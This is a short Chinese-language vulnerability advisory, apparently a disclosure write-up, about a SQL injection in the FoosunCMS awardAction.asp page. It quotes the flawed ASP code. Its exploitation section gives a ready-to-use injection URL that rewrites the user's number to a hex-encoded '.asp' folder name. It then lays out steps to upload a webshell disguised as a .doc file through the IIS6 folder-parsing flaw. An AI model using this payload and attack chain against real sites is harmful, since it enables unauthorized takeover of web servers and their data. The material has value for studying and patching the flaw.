@@ -1,0 +1,17 @@
+风讯awardAction.asp页面SQL注入漏洞
+
+[风讯awardAction.asp页面SQL注入漏洞 全文]
+影响版本:
+FooSun > 5.0
+
+程序介绍: 
+FoosunCMS是一款具有强大的功能的基于ASP+ACCESS/MSSQL构架的内容管理软件。
+
+漏洞分析:
+
+
+在文件\User\award\awardAction.asp中：Integral=NoSqlHack(request.QueryString("Integral")) //第14行if action="join" thenUser_Conn.execute("Insert into FS_ME_User_Prize (prizeid,usernumber,awardID) values("&CintStr(prizeID)&",''"&session("FS_UserNumber")&"'',"&CintStr(awardID)&")")''获得当前参加人数--------------------------------User_Conn.execute("Update FS_ME_Users set Integral=(Integral-"&Integral&") where usernumber=''"&session("FS_UserNumber")&"''")数字变量Integral使用过滤字符的函数过滤导致sql注入漏洞的产生，导致可以修改表FS_ME_User的任意内容，配合系统的其他功能可以拿到webshell
+
+漏洞利用: 
+
+注册用户登陆后，访问Url:http://www.sitedir.com.cn/User/award/awardAction.asp?action=join&awardID=1&prizeID=1&Integral=0),usernumber= 0x6C006C002E00610073007000,LoginNum=(1退出后再登陆，在文件管理处上传后缀为doc的webshell就可以拿到webshell。（利用IIS6对文件夹为*.asp的解析漏洞
